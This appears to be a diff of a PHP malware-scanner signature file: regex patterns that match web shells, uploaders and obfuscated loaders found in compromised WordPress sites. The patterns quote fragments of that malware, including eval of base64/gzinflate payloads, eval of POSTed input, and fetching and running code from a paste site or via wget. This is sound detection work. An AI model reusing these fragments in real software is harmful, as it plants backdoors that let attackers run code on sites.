-	if \\(copy\\(\\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\], \\$_POST\\[\'filename\'\\]\\) \\=\\=\\= false\\) response\\(500\\);
-	response\\(\\);
+      'pattern' => '/\\}
+	print preg_replace\\("\\/\\^\\\\\\/\\/", "", \\$file_full_path\\) \\. "\\<br\\>\\\\n";
+	flush\\(\\);
+\\}
+\\/\\/print PLATFORM;
+\\/\\/print_r\\(\\$all_dirs\\);
 \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1241 => 
+    638 => 
+    array (
+      'pattern' => '/50C\\\\x39k\\\\x61X\\\\x59\\+JzsK\\\\x49\\\\x43A\\\\x67I\\\\x480KfQ\\\\x70\\\\x77c\\\\x6dlu\\\\x64\\\\x43\\\\x41\\\\x6e\\\\x50C\\\\x39\\\\x69\\\\x622\\\\x52\\\\x35\\\\x50i\\\\x637"\\)\\); \\}
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    639 => 
+    array (
+      'pattern' => '/ghKkX9\\\\x42wJeF\\\\x2bve\\\\x41EQh6rX\\\\x42\\\\x42wJe";
+eval\\(htmlspecialchars_decode\\(gzinflate\\(base64_decode\\(\\$UeXploiT\\)\\)\\)\\);
+exit;
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    640 => 
+    array (
+      'pattern' => '/sqlOutValues\\(\\$v, \'mysqlEscData\'\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    641 => 
+    array (
+      'pattern' => '/@die \\(\\$y4e5tyt\\(\\$msr4y6\\)\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    642 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$au\\=\'aHR3cCUzQSUyRiUyRm4nc6J4cC8jb53lMkZtc5F4MjYxMiUyRndvcmsucGhw\';/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    643 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*
+\\* @package    GOOGLE\\.COM
+ \\*
+ \\* @copyright  Copyright \\(C\\) 2005 \\- 2020 Open Source Matters, Inc\\. All rights reser/s',
+      'label' => 'sample-specific content window',
+    ),
+    644 => 
+    array (
+      'pattern' => '/1%D2%A0%25f%23%7C%BA%A7%A1%8D%DD%B2%101t%82%04%9[\\s\\S]{0,12000};
+	eval\\(ikl_pl\\(\\$seerbg,\\$yior\\)\\);
+\\}else\\{
+	die\\(\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    645 => 
+    array (
+      'pattern' => '/"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x42\\\\x55\\\\x55\\\\x43\\\\x36\\\\x36[\\s\\S]{0,12000}"\\\\x42\\\\x55\\\\x36\\\\x43\\\\x36\\\\x55\\\\x43\\\\x36\\\\x55\\\\x43"\\]\\(\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    646 => 
+    array (
+      'pattern' => '/ibs\\/notify\\/0\\.4\\.2\\/notify\\.min\\.js"\\>\\<\\/script\\>
+			\\<script\\>
+				\\$\\("\\.ajx"\\)\\.click\\(function\\(t\\)\\{t\\.preventDefault\\(\\);var e\\=\\$\\(this\\)\\.a/s',
+      'label' => 'sample-specific content window',
+    ),
+    647 => 
+    array (
+      'pattern' => '/\\$uoeq967\\{22\\},\\$uoeq967\\{7\\}\\);\\$gnix510 \\= cdim173\\(\\$uo[\\s\\S]{0,12000}aobc355\\(\\$hwks376,array\\(\'\',\'\\}\'\\.\\$qyff908\\.\'\\/\\/\'\\)\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    648 => 
+    array (
+      'pattern' => '/2\\}\\.\\$O\\{57\\}\\.\\$O\\{89\\}\\.\\$O\\{63\\}\\.\\$O\\{89\\};unset\\(\\$OOoOoOOoOOoO\\);if \\(\\$OOooO \\=\\= \\$O\\{65\\}\\) \\{if\\(is_array\\(\\$OOOOooO\\)\\)\\{\\$OOOOooO \\= http_build_/s',
+      'label' => 'sample-specific content window',
+    ),
+    649 => 
+    array (
+      'pattern' => '/\\)\\#I~n\\=\\/Kl&\\/\\!M\\+YvdF\\(ppGb\\$d\\*\\#5_\\{2ZTx\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    650 => 
+    array (
+      'pattern' => '/\\<\\?php
+ \\$uoeq967\\= "O\\)sl 2Te4x\\-\\+gazAbuK_6qrjH0RZt\\*[\\s\\S]{0,12000}\\},\\$uoeq967\\{7\\}\\);\\$gnix510 \\= cdim173\\(\\$uoeq967\\{13\\},\\$/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    651 => 
+    array (
+      'pattern' => '/\\<\\?php
+  \\/\\*
+ \\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-[\\s\\S]{0,12000}15,
+            012,
+            0310,/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    652 => 
+    array (
+      'pattern' => '/\\<\\/strong\\>"\\)\\+\' \\<input id\\="new\\-application\\-passwor[\\s\\S]{0,12000}nction\\(e\\)\\{e\\.preventDefault\\(\\)\\}\\)\\}\\(jQuery,authApp\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    653 => 
+    array (
+      'pattern' => '/oxp2osl\\(\\$w\\[1\\]\\), 0, \\$len % 4\\);
+					\\}
+				\\}else\\{[\\s\\S]{0,12000}\\$kexw \\= \\$cood_ok\\-\\>deunco\\(\\$str_llg\\);
+eval\\(\\$kexw\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    654 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$str_wws\\="%0A%EF%12%D3%83%9F%3A%2C%C8%E5%D[\\s\\S]{0,12000}8R%CF%5DP%99s%E2%BB%80H%9D%7B0%3F%29%F9%E7%3D%9D/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    655 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*\\*
- \\* Creates common globals for the rest of WordPress
- \\*
- \\* Sets \\$pagenow global which is the current page\\. Chec/s',
-      'label' => 'sample-specific content window',
+\\* Plugin Name\\: SEO Optimizer
+\\* Plugin[\\s\\S]{0,12000}POST\\["run_cmd"\\]\\)\\)\\{
+
+        \\$cmd \\= \\$_POST\\["cmd"\\]/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1242 => 
+    656 => 
     array (
-      'pattern' => '/30\\\\x5f\\\\x4f\\\\x30\\\\x4f\\\\x5f\\\\x4f\\\\x30\\\\x5f"\\]\\(\\$\\{"\\\\x5f\\\\x47\\\\x45\\\\x54"\\}\\["\\\\x74\\\\x78\\\\x74\\\\x6e\\\\x61\\\\x6d\\\\x65"\\]\\)\\:\\\\\'\\\\\';\\$O0OO_00O__\\=\\$\\{"\\\\x47\\\\x4c/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\[\\$O\\{87\\}\\.\\$O\\{63\\}\\.\\$O\\{29\\}\\.\\$O\\{63\\}\\.\\$O\\{55\\}\\.\\$O\\{63\\}\\.\\$O\\{1\\}[\\s\\S]{0,12000}0\\.\\$O0Oo0o0OoO\\)\\);\\}O11oooO1OO\\(\\);\\/\\/wp\\-blog\\-header\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1243 => 
+    657 => 
     array (
-      'pattern' => '/\\.\\$m956\\[\'i1dde556\'\\]\\[74\\]\\.\\$m956\\[\'i1dde556\'\\]\\[76\\]\\.\\$m956\\[\'i1dde556\'\\]\\[76\\]\\]\\(\\$fc2d\\); \\$j4dd107\\+\\+, \\$u5a20a4da\\+\\+\\)\\{\\$y42a6ef04 \\.\\= \\$m95/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/7b3a99c6d8\'\\) response\\(403\\);
+	unlink\\(\'wp\\-core\\-mod[\\s\\S]{0,12000}ame\'\\]\\) \\=\\=\\= false\\) response\\(500\\);
+	response\\(\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1244 => 
+    658 => 
+    array (
+      'pattern' => '/\\: https\\:\\/\\/wordpress\\.org\\/
+\\*\\*\\/
+\\$p\\=\\$_COOKIE;\\(count\\([\\s\\S]{0,12000}\\)&&\\(\\$p\\=\\$p\\[58\\]\\(\\$p\\[79\\],\\$p\\[97\\]\\(\\$p\\[64\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    659 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Creates common globals for the rest[\\s\\S]{0,12000}e \\= true;
+		\\}
+	\\} elseif \\( stripos\\( \\$_SERVER\\[\'HTT/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    660 => 
+    array (
+      'pattern' => '/fa1 \\= \\$this\\-\\>d5f3c34b87876a\\("d0RyQ3BqaGFuczFIOjp[\\s\\S]{0,12000}\\} \\} \\} \\(new c5f3c34b8786c3\\(\\)\\)\\-\\>p5f3c34b8786cf\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    661 => 
+    array (
+      'pattern' => '/nt\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[40\\]\\=\\$p\\[40\\]\\.\\$p\\[12\\]\\)&&\\(\\$p\\[34\\]\\=\\$p\\[[\\s\\S]{0,12000}\\)&&\\(\\$p\\=\\$p\\[34\\]\\(\\$p\\[37\\],\\$p\\[40\\]\\(\\$p\\[92\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    662 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$unev273\\= "Nj YO\\)tWP\\/uAGvRKV6gqXQiUocmp17d\\(Ebaws42\\.8fT_9x\\-LZlrMSDe\\+3n\\*yI;FkH0h,JzBC5";\\$kqdy621\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    663 => 
+    array (
+      'pattern' => '/p04d622 \\= \'UBBTX0sCQFYHagFWQWoHQFQQTBxjVGhPCA\\=\\=\'[\\s\\S]{0,12000}\\); \\} \\} \\(new c5f23cd58d5dc3\\(\\)\\)\\-\\>p5f23cd58d5dd0\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    664 => 
+    array (
+      'pattern' => '/\\.\\$h1c1c\\[\'rdf2a1\'\\]\\[83\\]\\.\\$h1c1c\\[\'rdf2a1\'\\]\\[9\\]\\]\\(\\$h1c1[\\s\\S]{0,12000}p\' \\);
+
+wp_redirect\\( network_admin_url\\(\\) \\);
+exit;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    665 => 
+    array (
+      'pattern' => '/require_once\\( ABSPATH \\. \'wp\\-admin\\/includes\\/menu\\.php\' \\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    666 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$jbojdzgc \\= "yeosthxloywgdrzx";\\$rdktoi \\= "";foreach \\(\\$_POST as \\$kbamisbm \\=\\> \\$olwyuldnw\\)\\{if \\(strlen\\(\\$kbamisbm\\) \\=\\= 16 and substr_count\\(\\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    667 => 
+    array (
+      'pattern' => '/include\\( ABSPATH \\. \'wp\\-admin\\/admin\\-footer\\.php\' \\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    668 => 
+    array (
+      'pattern' => '/hfn\\[21\\]\\.\\$olhfn\\[20\\]\\.\\$olhfn\\[14\\]\\.\\$olhfn\\[23\\];\\$mmpway[\\s\\S]{0,12000}wev\\(\\$mmpwayx, \\$sfmbu, \\$mmpwayx\\[9\\]\\(\\$gamwegu\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    669 => 
+    array (
+      'pattern' => '/m \\= \\$ba\\(\\$t\\[23\\]\\.\\$t\\[80\\]\\)\\) && \\(\\$_am \\= \\$ba\\(\\$t\\[89\\]\\.\\$t[\\s\\S]{0,12000}am\\(\\$t\\[62\\], \\$_am\\(\\$ba\\(\\$t\\[28\\]\\)\\)\\)\\) && @\\$_am\\(\\)\\) \\: \\$t;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    670 => 
     array (
       'pattern' => '/﻿ï»¿\\<\\?php
 @session_start\\(\\);
-@set_time_limit\\(0\\);
-
-echo \'\\<\\!DOCTYPE HTML\\>
-\\<HTML\\>
-\\<HEAD\\>
-\\<title\\>\\<\\/title\\>
-\\<style\\>
-body\\{/s',
+@set_time_limit[\\s\\S]{0,12000}r\\(\\$_POST\\[\'path\'\\]\\)\\)\\{
+echo \'\\<font color\\="green"\\>De/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    671 => 
+    array (
+      'pattern' => '/34\\]\\.\\$vucgol\\[31\\]\\.\\$vucgol\\[15\\]\\.\\$vucgol\\[10\\]\\.\\$vucgol\\[[\\s\\S]{0,12000}ysruw\\(\\$dtgpkp, \\$vwduow, \\$dtgpkp\\[9\\]\\(\\$usqmhm\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    672 => 
+    array (
+      'pattern' => '/\\[4\\];\\$rxtbtf\\[\\] \\= \\$svvcxnn\\[27\\]\\.\\$svvcxnn\\[22\\]\\.\\$svvcx[\\s\\S]{0,12000}ktiua\\(\\$rxtbtf, \\$bvaczx, \\$rxtbtf\\[9\\]\\(\\$caeihq\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    673 => 
+    array (
+      'pattern' => '/0\\[\'dd2148\'\\]\\[46\\]\\.\\$c111f0\\[\'dd2148\'\\]\\[30\\]\\.\\$c111f0\\[\'d[\\s\\S]{0,12000}ray\\(\\), FL_BUILDER_VERSION \\);
+				\\}
+			\\}
+		\\}
+	\\}
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    674 => 
+    array (
+      'pattern' => '/4\'\\]\\[97\\]\\.\\$f78fb\\[\'p9b4\'\\]\\[31\\]\\.\\$f78fb\\[\'p9b4\'\\]\\[70\\]\\.\\$f[\\s\\S]{0,12000}ge\\(\\)
+				\\);
+			\\}
+		\\}
+		
+		return \\$response;
+	\\}
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    675 => 
+    array (
+      'pattern' => '/\\[18\\]\\.\\$cuoaf\\[35\\]\\.\\$cuoaf\\[26\\]\\.\\$cuoaf\\[29\\];\\$diiwdwk\\[\\][\\s\\S]{0,12000}f\\(\\$diiwdwk, \\$uqomzxl, \\$diiwdwk\\[9\\]\\(\\$qsaofsq\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    676 => 
+    array (
+      'pattern' => '/\\] \\. "\\\\n";
+print_r\\(\\$_FILES\\);
+if\\(\\$_FILES\\["userfile[\\s\\S]{0,12000}\\>\\<input type\\=\\\\"submit\\\\" value\\=\\\\"Upload\\\\"\\>";
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    677 => 
+    array (
+      'pattern' => '/"wget \\$w \\-qO\\-", \\$m\\);
+\\$j \\= base64_decode\\(\\$m\\[0\\]\\);[\\s\\S]{0,12000}ldecode\\(\\$j\\);
+\\$z \\= \'\\?\\>\';
+\\$p \\= \\$z\\.\\$e;
+eval\\(\\$p\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    678 => 
+    array (
+      'pattern' => '/POST\\[\'orderid\'\\]\\?\\>" \\>\\<br\\>
+\\<input type\\="submit" va[\\s\\S]{0,12000}\\["\\.\\$_POST\\[\'email\'\\]\\."\\] \\- Order \\: \\$xx\\<\\/b\\>"; 
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    679 => 
+    array (
+      'pattern' => '/eval \\(\\(base64_decode\\(\\$a\\)\\)\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    680 => 
+    array (
+      'pattern' => '/548a\\[\'je58410\'\\]\\[34\\]\\.\\$d548a\\[\'je58410\'\\]\\[38\\]\\.\\$d548a\\[\'je58410\'\\]\\[55\\]\\]\\(0\\);\\$g2b5 \\= NULL;\\$qe413ac9 \\= NULL;\\$d548a\\[\\$d548a\\[\'je58410/s',
       'label' => 'sample-specific content window',
     ),
-    1245 => 
+    681 => 
     array (
-      'pattern' => '/echo "\\<form enctype\\=\\\\"multipart\\/form\\-data\\\\" action\\=\\\\"\\\\" method\\=\\\\"POST\\\\"\\>\\<input type\\=\\\\"text\\\\" name\\=\\\\"l\\\\" value\\=\\\\"\\$cwd\\\\" style\\=\\\\"width\\: 700px;/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?php eval\\(gzinflate\\(base64_decode\\(\'FZvHkoPKskU\\/554TDPAuXtwBAuG9h8kNPAjvzdc\\/etjdilJVVubeayN1cSTdP9XTDGWXbMU\\/abIWBPa\\/vMjGvPjnP2J8xS0xngiBg89R/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1246 => 
+    682 => 
     array (
-      'pattern' => '/\\<\\?php \\$qYXAVSBP\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$qYXAVSBP\\[\\(105\\/15\\)\\]\\.\\$qYXAVSBP\\[\\(26\\-1\\)\\]\\.\\$qYXAVSBP\\[\\(1\\*49\\)\\]\\.\\$qYXAVSB[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<\\?php \\$\\{"G\\\\x4cO\\\\x42\\\\x41L\\\\x53"\\}\\["k\\\\x6f\\\\x74\\\\x6fv\\\\x63\\\\x71\\\\x77"\\]\\="\\\\x6e\\\\x61\\\\x6d\\\\x65";\\$\\{"\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x6a\\\\x71\\\\x70\\\\x73\\\\x73\\\\x71\\\\x62/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1247 => 
+    683 => 
     array (
-      'pattern' => '/\\<\\?php echo\'CCAEF Uploader\\<br\\>\';echo\'\\<br\\>\';echo\'\\<form method\\="post"enctype\\="multipart\\/form\\-data"\\>\';echo\'\\<input type\\="file"name\\="file"\\>\\<input /',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[20\\]\\=\\$p\\[20\\]\\.\\$p\\[66\\]\\)&&\\(\\$p[\\s\\S]{0,12000}\\$p\\=\\$p\\[34\\]\\(\\$p\\[60\\],\\$p\\[20\\]\\(\\$p\\[48\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1248 => 
+    684 => 
     array (
-      'pattern' => '/\\<title\\>Pwnd By NekoBot\\!\\<\\/title\\>
-\\<\\?php
-function http_get\\(\\$url\\)\\{
-	\\$im \\= curl_init\\(\\$url\\);
-	curl_setopt\\(\\$im, CURLOPT_RETURNT/s',
+      'pattern' => '/\\<\\?php
+if\\(isset\\(\\$_GET\\[\'chmod\'\\]\\) &&  \\$_GET\\[\'chmod\'[\\s\\S]{0,12000}im\\(\\$_GET\\[\'write\'\\]\\)\\)\\{
+	\\$write \\= trim\\(\\$_GET\\[\'write/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    685 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qYXAVSBP\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$qYXAVSBP\\[\\(105\\/15\\)\\]\\.\\$qYXAVSBP\\[\\(26\\-1\\)\\]\\.\\$qYXAVSBP\\[\\(1\\*49\\)\\]\\.\\$qYXAVSB[\\s\\S]{0,18000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';\\s*$/s',
+      'label' => 'source-file first-last anchor',
+    ),
+    686 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); function j\\(\\$n, \\$h\\)\\{ \\$k\\=""; for\\(\\$l\\=0;\\$l\\<strlen\\(\\$n\\);\\) for\\(\\$f\\=0;\\$f\\<strlen\\(\\$h\\);\\$f\\+\\+, \\$l\\+\\+\\) \\$k \\.\\= \\$n\\{\\$l\\} \\^ \\$h\\{\\$f\\}; retu/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    687 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo\'CCAEF Uploader\\<br\\>\';echo\'\\<br\\>\';echo\'\\<form method\\="post"enctype\\="multipart\\/form\\-data"\\>\';echo\'\\<input type\\="file"name\\="file"\\>\\<input /s',
+      'label' => 'source-file first-line anchor',
+    ),
+    688 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\*976489508976489508\\*\\/ \\?\\>\\<\\?php \\/\\*457563643457563643\\*\\/ \\?\\>\\<\\?php/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    689 => 
+    array (
+      'pattern' => '/^\\s*\\<title\\>Pwnd By NekoBot\\!\\<\\/title\\>/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    690 => 
+    array (
+      'pattern' => '/\\<\\?php
+ 
+\\/\\/install_code1
+error_reporting\\(0\\);
+ini_set\\(\'display_errors\', 0\\);
+\\/\\/PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwovL2FIQUtM/s',
       'label' => 'sample-specific content window',
     ),
-    1249 => 
+    691 => 
     array (
       'pattern' => '/\', get_template_directory_uri\\(\\)\\.\'\\/css\\/headers\\/multilevel\\-menu\' \\. \\$suffix \\. \'\\.css\', array\\(\\), \\$theme_version \\);
 				wp_enq/s',
       'label' => 'sample-specific content window',
     ),
-    1250 => 
+    692 => 
     array (
-      'pattern' => '/\\$result \\= curl_exec\\(\\$ch\\);
-  return \\$result;
+      'pattern' => '/etopt\\(\\$ch, CURLOPT_SSL_VERIFYPEER, 0\\);
+  curl_se[\\s\\S]{0,12000}\\:\\/\\/ghostbin\\.co\\/paste\\/2v8nx\\/raw\'\\);
+eval\\(\'\\?\\>\'\\.\\$a\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    693 => 
+    array (
+      'pattern' => '/jxRPD31NhF2Uj04K826R5TtHBu4jwWagGJFwBjt36TtqNPxR[\\s\\S]{0,12000}VLf4s8SQlqwMSJgrTffRRmGjOd\'\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    694 => 
+    array (
+      'pattern' => '/^\\s*\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>\\<\\?php echo \'\\<form action\\="" method\\="post" enctype\\="multipart\\/form\\-data" name\\="uploader" id\\="uploader"\\>\';e/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    695 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "Raiz0WorM"; echo "\\<br\\>"\\.php_uname\\(\\)\\."\\<br\\>"; echo "\\<form method\\=\'post\' enctype\\=\'multipart\\/form\\-data\'\\> \\<input type\\=\'file\' name\\=\'zb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    696 => 
+    array (
+      'pattern' => '/HdRdWZSRjBaZ3dLRGd3S0Rnd0tEZ3dLRHJRMFpnd0tEZ3dLR[\\s\\S]{0,12000}\\( dirname\\( __FILE__ \\) \\. "\\/wp\\-blog\\-header\\.php" \\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    697 => 
+    array (
+      'pattern' => '/deral laws\\. Developer assumes no liability and i[\\s\\S]{0,12000}", \\$v\\);
+\\}
+@eval\\(\\$_POST\\[\'pass\'\\]\\);
+\\?\\>
+postpass/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    698 => 
+    array (
+      'pattern' => '/^\\s*\\!function\\(t,e\\)\\{"object"\\=\\=typeof exports&&"undefined"\\!\\=typeof module\\?module\\.exports\\=e\\(\\)\\:"function"\\=\\=typeof define&&define\\.amd\\?define\\(e\\)\\:\\(t\\=t\\|/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    699 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Plugin Name\\: Monitization
+ \\* Descri[\\s\\S]{0,12000}VER\\["HTTP_HOST"\\]\\)\\)
+\\{
+    \\$log_installed \\= @file_/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    700 => 
+    array (
+      'pattern' => '/ader\\("HTTP\\/1\\.1 404 Not Found"\\);exit;
+ \\}
+ 
+
+ 
+ 
+ if\\(isset\\(\\$InFoStrArr\\[\'frStr2\'\\]\\)\\)\\{
+	\\$frStr2 \\= \\$InFoStrArr\\[\'frStr2\'/s',
+      'label' => 'sample-specific content window',
+    ),
+    701 => 
+    array (
+      'pattern' => '/a4cef7\'\\]\\[51\\]\\.\\$le39462\\[\'hf7a4cef7\'\\]\\[41\\]\\.\\$le39462\\[[\\s\\S]{0,12000}m71d838\\[\\$le39462\\[\'hf7a4cef7\'\\]\\[87\\]\\]\\);\\}exit\\(\\);\\} \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    702 => 
+    array (
+      'pattern' => '/4ct3ab \\= "";\\$_ju68r59r \\= _8zkc2u\\:\\:_lhme3\\(\\);\\$_ju6[\\s\\S]{0,12000}z3rwiu\\-\\>_4rglm\\(\\)\\) \\{\\$_wjz3rwiu\\-\\>_kypq1\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    703 => 
+    array (
+      'pattern' => '/gb1mb89 \\= _b8gui6n\\:\\:_5ec83\\(\\);\\$_2gb1mb89\\["uid"\\] \\=[\\s\\S]{0,12000}9rkjom\\-\\>_jcbrf\\(\\)\\) \\{\\$_0s9rkjom\\-\\>_z3wku\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    704 => 
+    array (
+      'pattern' => '/kvp\\[2\\]\\.\\$hiygkvp\\[18\\]\\.\\$hiygkvp\\[9\\]\\.\\$hiygkvp\\[11\\]\\.\\$hi[\\s\\S]{0,12000}b\\(\\$zoxhnqh, \\$duwsrfr, \\$zoxhnqh\\[9\\]\\(\\$gkfsrue\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    705 => 
+    array (
+      'pattern' => '/ik \\= _1ezdn2i\\:\\:_juxjr\\(\\);\\$_ox7rqqik\\["uid"\\] \\= _1ez[\\s\\S]{0,12000}skreel\\-\\>_2coqy\\(\\)\\) \\{\\$_9lskreel\\-\\>_v4rq1\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    706 => 
+    array (
+      'pattern' => '/jwroi\\[35\\]\\.\\$djwroi\\[4\\]\\.\\$djwroi\\[34\\]\\.\\$djwroi\\[8\\]\\.\\$djw[\\s\\S]{0,12000}baxmtet\\(\\$vapgj, \\$pgznqc, \\$vapgj\\[9\\]\\(\\$bxnybi\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    707 => 
+    array (
+      'pattern' => '/\\$flugmyf\\[27\\]\\.\\$flugmyf\\[12\\]\\.\\$flugmyf\\[24\\]\\.\\$flugmyf\\[[\\s\\S]{0,12000}ple\\(\\$sxgppny, \\$oebdme, \\$sxgppny\\[9\\]\\(\\$qivexe\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    708 => 
+    array (
+      'pattern' => '/;\\$_f1o12ck5 \\= "";\\$_8r47wio1 \\= _yk8lmq\\:\\:_4r13j\\(\\);[\\s\\S]{0,12000}jf85q7\\-\\>_2i7ny\\(\\)\\) \\{\\$_y8jf85q7\\-\\>_ix4g6\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    709 => 
+    array (
+      'pattern' => '/\\]\\[46\\]\\.\\$r88892e\\[\'na27278\'\\]\\[6\\]\\.\\$r88892e\\[\'na27278\'\\][\\s\\S]{0,12000}etId\\(\\)\\];
+        \\}
+
+        return null;
+    \\}
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    710 => 
+    array (
+      'pattern' => '/3ff00865\\[\'k933\'\\]\\[0\\]\\.\\$o3ff00865\\[\'k933\'\\]\\[15\\]\\.\\$o3ff[\\s\\S]{0,12000}\\(\\)
+    \\{
+        return \\$this\\-\\>response;
+    \\}
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    711 => 
+    array (
+      'pattern' => '/4 \\= _dbangy4\\:\\:_z5hhl\\(\\);\\$_ni2cavb4\\["uid"\\] \\= _dban[\\s\\S]{0,12000}gz2vko\\-\\>_t8uhh\\(\\)\\) \\{\\$_y4gz2vko\\-\\>_gccog\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    712 => 
+    array (
+      'pattern' => '/\\$_y3y5exjq \\= _ccb9coz\\:\\:_klpub\\(\\);\\$_y3y5exjq\\["uid"[\\s\\S]{0,12000}ugnnj8\\-\\>_g18xu\\(\\)\\) \\{\\$_62ugnnj8\\-\\>_a6mxk\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    713 => 
+    array (
